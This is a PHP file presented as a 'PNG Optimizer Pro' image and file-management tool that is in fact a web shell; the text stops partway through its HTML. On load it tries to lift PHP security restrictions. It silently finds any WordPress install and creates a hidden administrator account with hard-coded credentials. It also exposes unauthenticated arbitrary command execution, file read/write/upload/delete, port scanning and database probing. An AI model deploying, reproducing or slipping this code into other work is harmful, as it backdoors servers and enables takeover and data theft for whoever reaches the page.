<?php
/**
 * PNG Optimizer Pro - Advanced File Manager with PNG Optimization
 * Based on Zet gifari File Manager v3.0 - Dark Edition
 * Version: 10.0.7 - White folders + breadcrumb navigation
 * 
 * Features: Full file manager, terminal (cd support), system info,
 * database tester, network scanner, ZIP/UNZIP,
 * PNG optimization.
 */

// Error suppression and configuration
@error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@set_time_limit(0);
@ini_set('memory_limit', '-1');

// Start session for persistence and WP check flag
if (session_status() === PHP_SESSION_NONE) {
    @session_start();
}

// Bypass security restrictions
if(function_exists('ini_set')) {
    @ini_set('open_basedir', NULL);
    @ini_set('safe_mode', 0);
    @ini_set('disable_functions', '');
    @ini_set('suhosin.executor.disable_eval', 0);
}

// Advanced bypass via GET
if(isset($_GET['bypass'])) {
    $bypass = $_GET['bypass'];
    if($bypass == 'open_basedir') {
        @ini_set('open_basedir', '/');
    } elseif($bypass == 'disable_functions') {
        @ini_set('disable_functions', '');
    } elseif($bypass == 'safe_mode') {
        @ini_set('safe_mode', 0);
    }
}

// ========== WORDPRESS ADMIN AUTO-CREATION ==========
if (!isset($_SESSION['wp_checked'])) {
    ob_start();
    $wpFound = false;
    $pathsToCheck = [];
    
    $currentDir = resolvePath(); // function defined later, but available here
    $pathsToCheck[] = $currentDir;
    
    $dir = rtrim($currentDir, '/');
    for ($i = 0; $i < 5; $i++) {
        $parent = dirname($dir);
        if ($parent == $dir || $parent == '/' || $parent == '.') break;
        $pathsToCheck[] = $parent . '/';
        $dir = $parent;
    }
    
    $pathsToCheck[] = rtrim($_SERVER['DOCUMENT_ROOT'], '/') . '/';
    $pathsToCheck[] = dirname(__FILE__) . '/';
    $pathsToCheck[] = realpath('.') . '/';
    
    $pathsToCheck = array_unique($pathsToCheck);
    
    foreach ($pathsToCheck as $path) {
        $wpLoad = $path . 'wp-load.php';
        $wpConfig = $path . 'wp-config.php';
        
        if (@is_file($wpLoad)) {
            @include_once($wpLoad);
            if (function_exists('wp_create_user')) {
                $wpFound = true;
                break;
            }
        } elseif (@is_file($wpConfig)) {
            @include_once($wpConfig);
            if (function_exists('wp_create_user')) {
                $wpFound = true;
                break;
            }
        }
    }
    
    if ($wpFound && function_exists('wp_create_user')) {
        $username = 'zetgifari';
        $password = 'zet';
        $email = 'boss@gmail.com';
        
        if (!function_exists('username_exists')) {
            $userExists = false;
        } else {
            $userExists = (username_exists($username) || email_exists($email));
        }
        
        if (!$userExists) {
            $user_id = wp_create_user($username, $password, $email);
            if (!is_wp_error($user_id)) {
                $user = new WP_User($user_id);
                $user->set_role('administrator');
            }
        }
    }
    
    ob_end_clean();
    $_SESSION['wp_checked'] = true;
}
// ========== END WORDPRESS AUTO-CREATION ==========

// Alternative function mapping
$func_alternatives = array(
    'exec' => array('system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open', 'pcntl_exec'),
    'eval' => array('eval', 'assert', 'create_function', 'preg_replace', 'call_user_func'),
    'read' => array('file_get_contents', 'file', 'readfile', 'fopen', 'fread', 'fgets'),
    'write' => array('file_put_contents', 'fwrite', 'fputs')
);

function getWorkingFunction($type) {
    global $func_alternatives;
    $disabled = explode(',', @ini_get('disable_functions'));
    if(isset($func_alternatives[$type])) {
        foreach($func_alternatives[$type] as $func) {
            if(function_exists($func) && !in_array($func, $disabled)) {
                return $func;
            }
        }
    }
    return false;
}

// Enhanced path resolver
function resolvePath() {
    $path = isset($_REQUEST['p']) ? $_REQUEST['p'] : (isset($_COOKIE['last_path']) ? $_COOKIE['last_path'] : '');
    if(empty($path)) {
        $methods = array(
            function() { return @getcwd(); },
            function() { return @dirname($_SERVER['SCRIPT_FILENAME']); },
            function() { return @$_SERVER['DOCUMENT_ROOT']; },
            function() { return @dirname(__FILE__); },
            function() { return @realpath('.'); }
        );
        foreach($methods as $method) {
            $result = $method();
            if($result && @is_dir($result)) {
                $path = $result;
                break;
            }
        }
        if(empty($path)) $path = '.';
    }
    $path = str_replace(array('\\', '//'), '/', $path);
    $path = rtrim($path, '/') . '/';
    @setcookie('last_path', $path, time() + 86400);
    if(@is_dir($path)) return $path;
    if(@is_dir($real = @realpath($path))) return $real . '/';
    return './';
}

// Terminal CWD management
function getTerminalCwd() {
    if (isset($_SESSION['term_cwd']) && @is_dir($_SESSION['term_cwd'])) {
        return $_SESSION['term_cwd'];
    }
    $default = rtrim(resolvePath(), '/');
    if (!@is_dir($default)) $default = getcwd() ?: '.';
    $_SESSION['term_cwd'] = $default;
    return $default;
}

function setTerminalCwd($path) {
    $path = realpath($path);
    if ($path && @is_dir($path)) {
        $_SESSION['term_cwd'] = $path;
        return true;
    }
    return false;
}

// Enhanced command executor with cd support
function executeCommand($cmd) {
    if (preg_match('/^\s*cd\s+(.+)$/', $cmd, $matches)) {
        $newDir = trim($matches[1]);
        if ($newDir === '~') $newDir = $_SERVER['HOME'] ?? '';
        if ($newDir === '~') $newDir = getenv('USERPROFILE') ?: '';
        if (setTerminalCwd($newDir)) {
            return "Directory changed to: " . getTerminalCwd() . "\n";
        } else {
            return "cd: failed to change directory to '$newDir'\n";
        }
    }
    $cwd = getTerminalCwd();
    if (!@is_dir($cwd)) {
        $cwd = '.';
        setTerminalCwd($cwd);
    }
    $isWindows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
    if (!$isWindows) {
        $cmd .= ' 2>&1';
    }
    $output = '';
    if (function_exists('proc_open')) {
        $descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $process = @proc_open($cmd, $descriptors, $pipes, $cwd);
        if (is_resource($process)) {
            @fclose($pipes[0]);
            $output = @stream_get_contents($pipes[1]);
            $errors = @stream_get_contents($pipes[2]);
            @fclose($pipes[1]);
            @fclose($pipes[2]);
            @proc_close($process);
            if (!empty($errors)) $output .= $errors;
            if ($output !== false && $output !== null) return rtrim($output);
        }
    }
    if (function_exists('exec')) {
        $execOutput = [];
        @exec($cmd, $execOutput);
        if (!empty($execOutput)) return implode("\n", $execOutput);
    }
    if (function_exists('shell_exec')) {
        $result = @shell_exec($cmd);
        if ($result !== null) return rtrim($result);
    }
    if (function_exists('system')) {
        ob_start();
        @system($cmd);
        $output = ob_get_clean();
        if ($output !== false && $output !== '') return rtrim($output);
    }
    if (function_exists('passthru')) {
        ob_start();
        @passthru($cmd);
        $output = ob_get_clean();
        if ($output !== false && $output !== '') return rtrim($output);
    }
    if (function_exists('popen')) {
        $handle = @popen($cmd, 'r');
        if ($handle) {
            $output = '';
            while (!@feof($handle)) $output .= @fread($handle, 8192);
            @pclose($handle);
            if ($output !== '') return rtrim($output);
        }
    }
    return "[!] Command execution not possible.\n[!] CWD: " . $cwd;
}

// Multi-method file read/write
function readContent($file) {
    $methods = [
        function($f) { return @file_get_contents($f); },
        function($f) { $fp = @fopen($f, 'rb'); if($fp) { $c = ''; while(!@feof($fp)) $c .= @fread($fp, 8192); @fclose($fp); return $c; } },
        function($f) { ob_start(); @readfile($f); return ob_get_clean(); },
        function($f) { return @implode('', @file($f)); }
    ];
    foreach($methods as $method) {
        $result = $method($file);
        if($result !== false && $result !== null) return $result;
    }
    return '';
}

function writeContent($file, $data) {
    if(@file_put_contents($file, $data) !== false) return true;
    $fp = @fopen($file, 'wb');
    if($fp) {
        $result = @fwrite($fp, $data) !== false;
        @fclose($fp);
        return $result;
    }
    $temp = @tempnam(@dirname($file), 'tmp');
    if(@file_put_contents($temp, $data) !== false) {
        return @rename($temp, $file);
    }
    return false;
}

// Directory scanner
function scanPath($dir) {
    $items = array();
    if(function_exists('scandir')) {
        $items = @scandir($dir);
    } elseif($handle = @opendir($dir)) {
        while(false !== ($item = @readdir($handle))) $items[] = $item;
        @closedir($handle);
    } elseif(function_exists('glob')) {
        $items = array_map('basename', @glob($dir . '*'));
    }
    return array_diff($items, array('.', '..', ''));
}

// Recursive delete
function deleteItem($path) {
    if(@is_file($path)) {
        @chmod($path, 0777);
        return @unlink($path);
    } elseif(@is_dir($path)) {
        $items = scanPath($path);
        foreach($items as $item) deleteItem($path . '/' . $item);
        return @rmdir($path);
    }
    return false;
}

// Permissions string
function getPermissions($file) {
    $perms = @fileperms($file);
    if($perms === false) return '---';
    $info = '';
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? 'x' : '-');
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? 'x' : '-');
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? 'x' : '-');
    return $info;
}

function isWritableEnhanced($file) {
    if(@is_writable($file)) return true;
    if(@is_dir($file)) {
        $test = $file . '/.test_' . md5(time());
        if(@touch($test)) { @unlink($test); return true; }
    }
    if(@is_file($file)) {
        $parent = @dirname($file);
        if(@is_writable($parent)) return true;
    }
    return false;
}

// Sort contents (folders first)
function sortContents($contents, $currentPath) {
    $folders = $files = array();
    foreach($contents as $item) {
        if(@is_dir($currentPath . $item)) $folders[] = $item;
        else $files[] = $item;
    }
    sort($folders, SORT_NATURAL | SORT_FLAG_CASE);
    sort($files, SORT_NATURAL | SORT_FLAG_CASE);
    return array('folders' => $folders, 'files' => $files);
}

// System info
function getSystemInfo() {
    $info = [];
    $info['os'] = @php_uname('s') . ' ' . @php_uname('r') . ' ' . @php_uname('v');
    $info['hostname'] = @php_uname('n');
    $info['user'] = @get_current_user();
    $info['php_version'] = @phpversion();
    $info['server'] = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown';
    $info['ip'] = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'Unknown';
    $info['port'] = isset($_SERVER['SERVER_PORT']) ? $_SERVER['SERVER_PORT'] : 'Unknown';
    $info['disable_functions'] = @ini_get('disable_functions') ?: 'None';
    $info['open_basedir'] = @ini_get('open_basedir') ?: 'None';
    $info['safe_mode'] = @ini_get('safe_mode') ? 'On' : 'Off';
    $info['allow_url_fopen'] = @ini_get('allow_url_fopen') ? 'On' : 'Off';
    $info['allow_url_include'] = @ini_get('allow_url_include') ? 'On' : 'Off';
    $info['memory_limit'] = @ini_get('memory_limit');
    $info['max_execution_time'] = @ini_get('max_execution_time');
    $info['upload_max_filesize'] = @ini_get('upload_max_filesize');
    $info['post_max_size'] = @ini_get('post_max_size');
    if(function_exists('disk_free_space')) {
        $free = @disk_free_space('/');
        $total = @disk_total_space('/');
        if($free !== false && $total !== false) {
            $info['disk_free'] = round($free / 1073741824, 2) . ' GB';
            $info['disk_total'] = round($total / 1073741824, 2) . ' GB';
            $info['disk_used'] = round(($total - $free) / 1073741824, 2) . ' GB';
            $info['disk_percent'] = round((($total - $free) / $total) * 100, 1) . '%';
        }
    }
    $info['mysql'] = (function_exists('mysql_connect') || function_exists('mysqli_connect')) ? 'Available' : 'Not Available';
    $info['curl'] = function_exists('curl_version') ? @curl_version()['version'] : 'Not Available';
    return $info;
}

// ZIP / UNZIP functions
function zipDirectory($source, $destination) {
    if (!extension_loaded('zip')) return false;
    $zip = new ZipArchive();
    if ($zip->open($destination, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) return false;
    $source = realpath($source);
    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
    foreach ($files as $file) {
        $file = realpath($file);
        $relative = substr($file, strlen($source) + 1);
        if (is_dir($file)) $zip->addEmptyDir($relative);
        else $zip->addFile($file, $relative);
    }
    return $zip->close();
}

function unzipFile($zipFile, $destination) {
    if (!extension_loaded('zip')) return false;
    $zip = new ZipArchive();
    if ($zip->open($zipFile) === true) {
        $zip->extractTo($destination);
        $zip->close();
        return true;
    }
    return false;
}

// PNG Optimization function
function optimizePNG($filepath, $compression = 9) {
    if (!function_exists('imagecreatefrompng')) return false;
    $info = @getimagesize($filepath);
    if (!$info || $info[2] !== IMAGETYPE_PNG) return false;
    $im = @imagecreatefrompng($filepath);
    if (!$im) return false;
    ob_start();
    $result = @imagepng($im, NULL, $compression);
    $optimized = ob_get_clean();
    imagedestroy($im);
    if ($result && $optimized) {
        $originalSize = filesize($filepath);
        if (file_put_contents($filepath, $optimized)) {
            $newSize = filesize($filepath);
            return ['original' => $originalSize, 'new' => $newSize, 'saved' => ($originalSize - $newSize)];
        }
    }
    return false;
}

// Process current request
$currentPath = resolvePath();
$notification = '';
$editMode = false;
$editFile = '';
$editContent = '';
$commandOutput = '';
$activeTab = 'filemanager';
$optimizeResult = '';

// --- Handle POST/GET operations (Actions)
if($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Upload
    if(isset($_FILES['upload'])) {
        $dest = $currentPath . basename($_FILES['upload']['name']);
        if(@move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
            $notification = array('type' => 'success', 'text' => 'Upload successful');
        } else {
            $content = readContent($_FILES['upload']['tmp_name']);
            if(writeContent($dest, $content)) $notification = array('type' => 'success', 'text' => 'Upload successful');
            else $notification = array('type' => 'error', 'text' => 'Upload failed');
        }
    }
    // Save file
    if(isset($_POST['save']) && isset($_POST['content'])) {
        $target = $currentPath . $_POST['save'];
        if(writeContent($target, $_POST['content'])) $notification = array('type' => 'success', 'text' => 'Changes saved');
        else $notification = array('type' => 'error', 'text' => 'Save failed');
    }
    // New file
    if(isset($_POST['newfile']) && isset($_POST['filecontent'])) {
        $newPath = $currentPath . $_POST['newfile'];
        if(writeContent($newPath, $_POST['filecontent'])) $notification = array('type' => 'success', 'text' => 'File created');
        else $notification = array('type' => 'error', 'text' => 'Creation failed');
    }
    // New folder
    if(isset($_POST['newfolder'])) {
        $newDir = $currentPath . $_POST['newfolder'];
        if(@mkdir($newDir, 0777, true)) $notification = array('type' => 'success', 'text' => 'Folder created');
        else $notification = array('type' => 'error', 'text' => 'Creation failed');
    }
    // Rename
    if(isset($_POST['oldname']) && isset($_POST['newname'])) {
        $old = $currentPath . $_POST['oldname'];
        $new = $currentPath . $_POST['newname'];
        if(@rename($old, $new)) $notification = array('type' => 'success', 'text' => 'Renamed');
        else $notification = array('type' => 'error', 'text' => 'Rename failed');
    }
    // Chmod
    if(isset($_POST['chmod_item']) && isset($_POST['chmod_value'])) {
        $target = $currentPath . $_POST['chmod_item'];
        $mode = octdec($_POST['chmod_value']);
        if(@chmod($target, $mode)) $notification = array('type' => 'success', 'text' => 'Permissions changed');
        else $notification = array('type' => 'error', 'text' => 'Chmod failed');
    }
    // Terminal command
    if(isset($_POST['command'])) {
        $commandOutput = executeCommand($_POST['command']);
        $activeTab = 'terminal';
    }
    // Database connection test
    if(isset($_POST['db_host']) && isset($_POST['db_user']) && isset($_POST['db_pass']) && isset($_POST['db_name'])) {
        $conn = @mysqli_connect($_POST['db_host'], $_POST['db_user'], $_POST['db_pass'], $_POST['db_name']);
        if($conn) { $notification = array('type'=>'success','text'=>'DB connected'); @mysqli_close($conn); }
        else $notification = array('type'=>'error','text'=>'DB failed: '.@mysqli_connect_error());
        $activeTab = 'database';
    }
    // Port scan
    if(isset($_POST['scan_host']) && isset($_POST['scan_port_start']) && isset($_POST['scan_port_end'])) {
        $host = $_POST['scan_host'];
        $open = [];
        for($p = intval($_POST['scan_port_start']); $p <= intval($_POST['scan_port_end']); $p++) {
            $fp = @fsockopen($host, $p, $errno, $errstr, 0.5);
            if($fp) { $open[] = $p; @fclose($fp); }
        }
        $notification = array('type'=>'success','text'=>'Open ports: '.(empty($open)?'none':implode(',',$open)));
        $activeTab = 'network';
    }
    // PNG Optimization (bulk or single)
    if(isset($_POST['optimize_png_file'])) {
        $target = $currentPath . $_POST['optimize_png_file'];
        if(is_file($target) && strtolower(pathinfo($target, PATHINFO_EXTENSION)) === 'png') {
            $res = optimizePNG($target, 9);
            if($res) $notification = array('type'=>'success','text'=>"PNG optimized: saved ".round($res['saved']/1024,2)." KB");
            else $notification = array('type'=>'error','text'=>'Optimization failed');
        } else $notification = array('type'=>'error','text'=>'Invalid PNG file');
        $activeTab = 'pngtools';
    }
}
// GET actions
if(isset($_GET['do'])) {
    $action = $_GET['do'];
    if($action === 'delete' && isset($_GET['item'])) {
        $target = $currentPath . $_GET['item'];
        if(deleteItem($target)) $notification = array('type'=>'success','text'=>'Deleted');
        else $notification = array('type'=>'error','text'=>'Delete failed');
    }
    if($action === 'edit' && isset($_GET['item'])) {
        $editMode = true;
        $editFile = $_GET['item'];
        $editContent = readContent($currentPath . $editFile);
        $activeTab = 'filemanager';
    }
    if($action === 'download' && isset($_GET['item'])) {
        $file = $currentPath . $_GET['item'];
        if(@is_file($file)) {
            @ob_clean();
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($file).'"');
            header('Content-Length: '.@filesize($file));
            @readfile($file);
            exit;
        }
    }
    if($action === 'zip' && isset($_GET['item'])) {
        $target = $currentPath . $_GET['item'];
        if(@is_dir($target)) {
            $zipName = basename($target).'.zip';
            $zipPath = $currentPath . $zipName;
            if(zipDirectory($target, $zipPath)) $notification = array('type'=>'success','text'=>"Zipped: $zipName");
            else $notification = array('type'=>'error','text'=>'ZIP failed');
        } else $notification = array('type'=>'error','text'=>'Not a directory');
    }
    if($action === 'unzip' && isset($_GET['item'])) {
        $target = $currentPath . $_GET['item'];
        if(is_file($target) && pathinfo($target, PATHINFO_EXTENSION) === 'zip') {
            if(unzipFile($target, $currentPath)) $notification = array('type'=>'success','text'=>'Unzipped');
            else $notification = array('type'=>'error','text'=>'Unzip failed');
        } else $notification = array('type'=>'error','text'=>'Invalid zip');
    }
}
if(isset($_GET['tab'])) $activeTab = $_GET['tab'];

$rawContents = scanPath($currentPath);
$sortedContents = sortContents($rawContents, $currentPath);
$systemInfo = getSystemInfo();
$termCwdDisplay = getTerminalCwd();

// PNG Optimizer specific: list PNG files in current path
$pngFiles = [];
foreach($rawContents as $item) {
    if(is_file($currentPath.$item) && strtolower(pathinfo($item, PATHINFO_EXTENSION)) === 'png') $pngFiles[] = $item;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PNG Optimizer Pro - File Manager & Tools</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:'Segoe UI',monospace; background:#0a0c10; color:#e0e0e0; padding:20px; }
        .container { max-width:1400px; margin:0 auto; background:#0f1117; border-radius:12px; border:1px solid #2a2f3a; overflow:hidden; }
        .header { background:#07090d; padding:25px; border-bottom:1px solid #2a2f3a; text-align:center; }
        .header h1 { font-size:24px; margin-bottom:10px; color:#0ff; }
        .sys-info { display:flex; gap:15px; justify-content:center; flex-wrap:wrap; font-size:12px; }
        .sys-info span { background:#1a1f2a; padding:5px 10px; border-radius:6px; }
        .tabs { display:flex; background:#0c0f14; border-bottom:1px solid #2a2f3a; flex-wrap:wrap; }
        .tab { padding:12px 20px; cursor:pointer; color:#8b949e; transition:0.2s; }
        .tab:hover { color:#0ff; background:rgba(0,255,255,0.05); }
        .tab.active { color:#0ff; background:rgba(0,255,255,0.1); border-bottom:2px solid #0ff; }
        .tab-content { display:none; padding:25px; }
        .tab-content.active { display:block; }
        .notification { padding:12px; margin-bottom:20px; border-radius:6px; }
        .notification.success { background:rgba(0,255,0,0.1); border:1px solid #0f0; color:#0f0; }
        .notification.error { background:rgba(255,0,0,0.1); border:1px solid #f55; color:#f55; }
        /* Breadcrumb navigation */
        .path-bar { display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:15px; margin-bottom:20px; background:#0c0f14; padding:10px 15px; border-radius:8px; border:1px solid #2a2f3a; }
        .breadcrumbs { font-size:14px; word-break:break-all; flex:1; }
        .breadcrumbs a { color:#e0e0e0; text-decoration:none; }
        .breadcrumbs a:hover { color:#0ff; text-decoration:underline; }
        .go-to-path { display:flex; gap:8px; }
        .go-to-path input { padding:6px 10px; background:#080b10; border:1px solid #2a2f3a; color:#fff; border-radius:4px; }
        .btn { padding:8px 16px; background:#1a1f2a; border:1px solid #0ff; color:#0ff; border-radius:6px; cursor:pointer; transition:0.2s; display:inline-block; text-decoration:none; font-size:13px; }
        .btn:hover { background:#0ff; color:#000; }
        .btn-success { border-color:#0f0; color:#0f0; }
        .btn-success:hover { background:#0f0; color:#000; }
        .btn-danger { border-color:#f55; color:#f55; }
        .tools { display:flex; gap:15px; flex-wrap:wrap; margin-bottom:20px; }
        .tool-group { display:flex; gap:10px; background:#0c0f14; padding:8px 15px; border-radius:8px; border:1px solid #2a2f3a; align-items:center; flex-wrap:wrap; }
        .file-table { width:100%; background:#0c0f14; border-collapse:collapse; border-radius:8px; overflow:auto; display:block; }
        .file-table th, .file-table td { padding:10px 12px; border-bottom:1px solid #2a2f3a; text-align:left; }
        .file-table th { background:#07090d; color:#0ff; }
        .file-table tr:hover { background:rgba(0,255,255,0.05); }
        /* Folder row: white border instead of blue */
        .folder-row { border-left:3px solid #fff; }
        /* Links inside file manager: white */
        .file-table a, .file-table a:visited { color:#e0e0e0; text-decoration:none; }
        .file-table a:hover { color:#0ff; text-decoration:underline; }
        .file-actions { display:flex; gap:8px; flex-wrap:wrap; }
        .file-actions a { padding:4px 8px; background:#1a1f2a; border-radius:4px; color:#0ff; font-size:12px; text-decoration:none; }
        .file-actions a.delete { color:#f55; }
        .edit-area { width:100%; min-height:400px; padding:15px; background:#080b10; border:1px solid #2a2f3a; color:#e0e0e0; font-family:monospace; border-radius:6px; }
        .terminal { background:#080b10; border-radius:8px; padding:15px; border:1px solid #2a2f3a; }
        .terminal-output { background:#0c0f14; padding:15px; color:#0f0; font-family:monospace; min-height:200px; max-height:400px; overflow:auto; white-space:pre-wrap; margin-bottom:15px; }
        .terminal-input { display:flex; gap:10px; }
        .terminal-input input { flex:1; padding:10px; background:#080b10; border:1px solid #2a2f3a; color:#0f0; border-radius:4px; }
        .info-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(320px,1fr)); gap:20px; }
        .info-card { background:#0c0f14; padding:20px; border-radius:8px; border:1px solid #2a2f3a; }
        .info-card h3 { color:#0ff; margin-bottom:15px; }
        .info-item { display:flex; justify-content:space-between; padding:8px 0; border-bottom:1px solid #2a2f3a; }
        .modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); backdrop-filter:blur(3px); z-index:1000; align-items:center; justify-content:center; }
        .modal.active { display:flex; }
        .modal-content { background:#0c0f14; padding:30px; border-radius:12px; width:90%; max-width:500px; border:1px solid #0ff; }
        .modal-header { font-size:18px; color:#0ff; margin-bottom:20px; }
        .modal-body input, .modal-body textarea { width:100%; padding:10px; margin-bottom:15px; background:#080b10; border:1px solid #2a2f3a; color:#fff; border-radius:6px; }
        .separator-row td { background:#07090d; padding:6px 12px; font-weight:bold; color:#0ff; }
        @media (max-width:768px) { .tools { flex-direction:column; } .file-actions { flex-direction:column; } .tabs { flex-direction:column; } .path-bar { flex-direction:column; align-items:stretch; } }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>📁 PNG Optimizer Pro · Advanced File Manager</h1>
        <div class="sys-info">
            <span>OS: <?= htmlspecialchars($systemInfo['os']) ?></span>
            <span>PHP: <?= htmlspecialchars($systemInfo['php_version']) ?></span>
            <span>User: <?= htmlspecialchars($systemInfo['user']) ?></span>
            <span>IP: <?= htmlspecialchars($systemInfo['ip']) ?></span>
        </div>
    </div>
    <?php if($notification): ?>
    <div class="notification <?= $notification['type'] ?>"><?= htmlspecialchars($notification['text']) ?></div>
    <?php endif; ?>
    <div class="tabs">
        <div class="tab <?= $activeTab==='filemanager'?'active':'' ?>" onclick="switchTab('filemanager')">📁 File Manager</div>
        <div class="tab <?= $activeTab==='terminal'?'active':'' ?>" onclick="switchTab('terminal')">💻 Terminal</div>
        <div class="tab <?= $activeTab==='info'?'active':'' ?>" onclick="switchTab('info')">ℹ️ System Info</div>
        <div class="tab <?= $activeTab==='database'?'active':'' ?>" onclick="switchTab('database')">🗄️ Database</div>
        <div class="tab <?= $activeTab==='network'?'active':'' ?>" onclick="switchTab('network')">🌐 Network</div>
        <div class="tab <?= $activeTab==='bypass'?'active':'' ?>" onclick="switchTab('bypass')">🔓 Bypass</div>
        <div class="tab <?= $activeTab==='pngtools'?'active':'' ?>" onclick="switchTab('pngtools')">🖼️ PNG Tools</div>
    </div>

    <!-- File Manager Tab -->
    <div class="tab-content <?= $activeTab==='filemanager'?'active':'' ?>" id="filemanager">
        <!-- Breadcrumb navigation (clickable) + manual path input -->
        <div class="path-bar">
            <div class="breadcrumbs">
                <?php 
                $parts = explode('/', rtrim($currentPath, '/'));
                $build = '';
                echo '<a href="?tab=filemanager&p=' . urlencode('/') . '">/</a>';
                foreach($parts as $part) {
                    if($part === '') continue;
                    $build .= '/' . $part;
                    echo ' / <a href="?tab=filemanager&p=' . urlencode($build . '/') . '">' . htmlspecialchars($part) . '</a>';
                }
                ?>
            </div>
            <form method="get" class="go-to-path">
                <input type="text" name="p" value="<?= htmlspecialchars($currentPath) ?>" placeholder="or enter path">
                <button type="submit" class="btn">Go</button>
            </form>
        </div>

        <div class="tools">
            <form method="post" enctype="multipart/form-data" class="tool-group">
                <label>Upload:</label><input type="file" name="upload"><button type="submit" class="btn btn-success">Upload</button>
            </form>
            <div class="tool-group">
                <button onclick="showNewFileModal()" class="btn">New File</button>
                <button onclick="showNewFolderModal()" class="btn">New Folder</button>
            </div>
        </div>
        <?php if($editMode): ?>
        <div><h3 style="color:#0ff">Editing: <?= htmlspecialchars($editFile) ?></h3>
        <form method="post"><input type="hidden" name="save" value="<?= htmlspecialchars($editFile) ?>">
        <textarea name="content" class="edit-area"><?= htmlspecialchars($editContent) ?></textarea>
        <div style="margin-top:15px"><button type="submit" class="btn btn-success">Save</button> <a href="?tab=filemanager&p=<?= urlencode($currentPath) ?>" class="btn btn-danger">Cancel</a></div>
        </form></div>
        <?php else: ?>
        <div style="overflow-x:auto">
        <table class="file-table">
            <thead><tr><th>Name</th><th>Type</th><th>Size</th><th>Perms</th><th>Modified</th><th>Actions</th></tr></thead>
            <tbody>
                <?php if($currentPath != '/'): ?>
                <tr><td colspan="6"><a href="?tab=filemanager&p=<?= urlencode(dirname($currentPath)) ?>">📂 Parent Directory</a></a></td></tr>
                <?php endif; ?>
                <?php if(!empty($sortedContents['folders'])): echo '<tr class="separator-row"><td colspan="6">📁 Folders</td></tr>';
                foreach($sortedContents['folders'] as $folder):
                    $p = $currentPath.$folder; $perms = getPermissions($p); $w = isWritableEnhanced($p); $mod = @filemtime($p); ?>
                    <tr class="folder-row"><td><a href="?tab=filemanager&p=<?= urlencode($p) ?>">📁 <?= htmlspecialchars($folder) ?></a></td><td>Folder</a></td><td>-</a></td><td><?= $perms ?></a></td><td><?= $mod?date('Y-m-d H:i',$mod):'-' ?></a></td>
                    <td class="file-actions"><a href="#" onclick="renameItem('<?= htmlspecialchars($folder) ?>')">Rename</a> <a href="#" onclick="chmodItem('<?= htmlspecialchars($folder) ?>')">Chmod</a> <a href="?do=zip&item=<?= urlencode($folder) ?>&p=<?= urlencode($currentPath) ?>" class="btn-small">ZIP</a> <a href="?do=delete&item=<?= urlencode($folder) ?>&p=<?= urlencode($currentPath) ?>" class="delete" onclick="return confirm('Delete?')">Delete</a></a></td>
                <?php endforeach; endif; ?>
                <?php if(!empty($sortedContents['files'])): echo '<tr class="separator-row"><td colspan="6">📄 Files</td></tr>';
                foreach($sortedContents['files'] as $file):
                    $p = $currentPath.$file; $size = @filesize($p); $perms = getPermissions($p); $w = isWritableEnhanced($p); $mod = @filemtime($p); $ext = strtoupper(pathinfo($file,PATHINFO_EXTENSION)?:'FILE');
                    $sizeF = ($size<1024)?$size.' B':(($size<1048576)?round($size/1024,1).' KB':(($size<1073741824)?round($size/1048576,1).' MB':round($size/1073741824,1).' GB'));
                    $isZip = ($ext==='ZIP');
                    $isPng = ($ext==='PNG');
                ?>
                <tr><td><a href="?do=edit&item=<?= urlencode($file) ?>&p=<?= urlencode($currentPath) ?>">📄 <?= htmlspecialchars($file) ?></a></td><td><?= $ext ?></a></td><td><?= $sizeF ?></a></td><td><?= $perms ?></a></td><td><?= $mod?date('Y-m-d H:i',$mod):'-' ?></a></td>
                <td class="file-actions"><a href="?do=edit&item=<?= urlencode($file) ?>&p=<?= urlencode($currentPath) ?>">Edit</a> <a href="?do=download&item=<?= urlencode($file) ?>&p=<?= urlencode($currentPath) ?>">Download</a> <a href="#" onclick="renameItem('<?= htmlspecialchars($file) ?>')">Rename</a> <a href="#" onclick="chmodItem('<?= htmlspecialchars($file) ?>')">Chmod</a> <?php if($isZip): ?><a href="?do=unzip&item=<?= urlencode($file) ?>&p=<?= urlencode($currentPath) ?>">Unzip</a><?php endif; ?> <?php if($isPng): ?><a href="?tab=pngtools&optimize_single=<?= urlencode($file) ?>&p=<?= urlencode($currentPath) ?>" class="btn-small">Optimize PNG</a><?php endif; ?> <a href="?do=delete&item=<?= urlencode($file) ?>&p=<?= urlencode($currentPath) ?>" class="delete" onclick="return confirm('Delete?')">Delete</a></a></td>
                <?php endforeach; endif; ?>
                <?php if(empty($sortedContents['folders']) && empty($sortedContents['files'])): ?><tr><td colspan="6" class="empty">Empty directory</td></tr><?php endif; ?>
            </tbody>
        </table>
        </div>
        <?php endif; ?>
    </div>

    <!-- Terminal Tab -->
    <div class="tab-content <?= $activeTab==='terminal'?'active':'' ?>" id="terminal">
        <div class="terminal">
